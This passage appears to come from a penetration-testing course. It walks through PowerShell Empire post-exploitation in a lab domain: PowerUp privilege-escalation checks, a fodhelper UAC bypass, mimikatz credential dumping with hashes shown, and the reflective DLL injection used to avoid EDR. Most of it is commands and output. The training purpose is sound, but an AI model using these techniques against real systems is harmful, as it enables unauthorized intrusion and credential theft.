The _privesc_ category contains privilege escalation modules. One of the more interesting modules in this group is _powerup/allchecks_. It uses several techniques based on misconfigurations such as unquoted service paths, improper permissions on service executables, and much more.

```
(Empire: powershell/situational_awareness/network/powerview/get_user) > usemodule powershell/privesc/powerup/allchecks

(Empire: powershell/privesc/powerup/allchecks) > execute
Job started: N459AD

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.
...
```

The _bypassuac_fodhelper_ module is quite useful if we have access to a local administrator account. Depending on the local Windows version, this module can bypass UAC and launch a high-integrity PowerShell Empire agent:

```
(Empire: S2Y5XW1L) > usemodule privesc/bypassuac_fodhelper

(Empire: powershell/privesc/bypassuac_fodhelper) > info

              Name: Invoke-FodHelperBypass
            Module: powershell/privesc/bypassuac_fodhelper
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  Petr Medonos

Description:
  Bypasses UAC by performing an registry modification for
  FodHelper (based on https://winscripting.blog/2017/05/12
  /first-entry-welcome-and-uac-bypass/)

Comments:
  https://winscripting.blog/2017/05/12/first-entry-welcome-
  and-uac-bypass/

Options:

Name       Required    Value           Description
----       --------    -------         -----------
Listener   True                        Listener to use.                        
UserAgent  False       default         User-agent string to use for the staging
                                       request (default, none, or other).      
Proxy      False       default         Proxy to use for request (default, none,
                                       or other).                              
Agent      True        S2Y5XW1L        Agent to run module on.                 
ProxyCreds False       default         Proxy credentials                       
                                       ([domain\]username:password) to use for 
                                       request (default, none, or other).      

(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http

(Empire: powershell/privesc/bypassuac_fodhelper) > execute
[>] Module is not opsec safe, run? [y/N] y

(Empire: powershell/privesc/bypassuac_fodhelper) > 
Job started: 4STVDU
[+] Initial agent K678VC13 from 10.11.0.22 now active (Slack)

(Empire: powershell/privesc/bypassuac_fodhelper) > 
```

Once we have a high-integrity session, we can perform actions that require local administrator or SYSTEM rights, such as executing mimikatz to dump cached credentials.

```
(Empire: agents) > interact K678VC13

(Empire: K678VC13) > usemodule credentials/
credential_injection*     mimikatz/extract_tickets  mimikatz/sam*
enum_cred_store           mimikatz/golden_ticket    mimikatz/silver_ticket
invoke_kerberoast         mimikatz/keys*            mimikatz/trust_keys*
mimikatz/cache*           mimikatz/logonpasswords*  powerdump*
mimikatz/certs*           mimikatz/lsadump*         sessiongopher
mimikatz/command*         mimikatz/mimitokens*      tokens
mimikatz/dcsync           mimikatz/pth*             vault_credential*
mimikatz/dcsync_hashdump  mimikatz/purge            
```

The _credentials_ category in Listing 22 contains multiple mimikatz commands that have been ported into Empire. The commands marked with an asterisk require a high-integrity Empire agent.

Empire uses reflective DLL injection to load the mimikatz library into the agent directly from memory.

Loading our malicious executable in this way minimizes the risk of detection since most EDR solutions only analyze files stored on the hard drive.

This method is custom-coded into the agent as Windows does not expose any official APIs (similar to LoadLibrary) that would allow us to achieve the same objective.

Let's take a look at a high-integrity access module such as _logonpasswords_:

```
(Empire: K678VC13) > usemodule credentials/mimikatz/logonpasswords

(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
Job started: NXK271

Hostname: client251.corp.com / S-1-5-21-3048852426-3234707088-723452474

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 244851 (00000000:0003bc73)
Session           : Interactive from 1
User Name         : offsec
Domain            : corp
Logon Server      : DC01
Logon Time        : 2/20/2019 10:36:32 PM
SID               : S-1-5-21-3048852426-3234707088-723452474-1103
	msv :	
	 [00000003] Primary
	 * Username : offsec
	 * Domain   : corp
	 * NTLM     : e2b475c11da2a0748290d87aa966c327
	 * SHA1     : 8c77f430e4ab8acb10ead387d64011c76400d26e
	 * DPAPI    : c10c264a27b63c4e66728bbef4be8aab
	tspkg :	
	wdigest :	
	 * Username : offsec
	 * Domain   : corp
	 * Password : (null)
	kerberos :	
	 * Username : offsec
	 * Domain   : CORP.COM
	 * Password : (null)
	ssp :	
	credman :	
...
```

This output is identical to mimikatz but the collected credentials are also written into the credential store, which can be enumerated with creds:

```
(Empire: K678VC13) > creds

Credentials:

CredID  CredType   Domain     UserName     Host        Password
------  --------   ------     --------     ----        --------
1       hash       corp.com   offsec       client251   e2b475c11da2a0748290d87aa966c32
2       hash       corp.com   CLIENT251$   client251   4d4ae0e7cb16d4cfe6a91412b3d80ed
```

We can also manually enter data into the credentials store with creds add as shown in Listing 25.

```
(Empire: K678VC13) > creds add corp.com jeff_admin Qwerty09!

Credentials:

CredID  CredType   Domain     UserName     Host        Password
------  --------   ------     --------     ----        --------
1       hash       corp.com   offsec       client251   e2b475c11da2a0748290d87aa966c32
2       hash       corp.com   CLIENT251$   client251   4d4ae0e7cb16d4cfe6a91412b3d80ed
3       plaintext  corp.com   jeff_admin               Qwerty09!
```
